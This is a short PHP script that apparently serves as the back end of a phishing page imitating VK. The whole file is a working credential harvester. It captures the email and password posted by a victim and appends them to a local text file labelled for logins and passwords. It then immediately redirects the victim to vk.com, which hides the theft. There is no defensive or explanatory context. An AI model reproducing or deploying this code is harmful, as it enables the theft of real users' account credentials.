<?php

$login = $_POST['email'];

$pass = $_POST['pass'];

$file = fopen("my_pass.txt", 'at');

fwrite($file,"Login —> $login\nPass —> $pass\n-----\n");

fclose($file);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com'></head></html>";

?>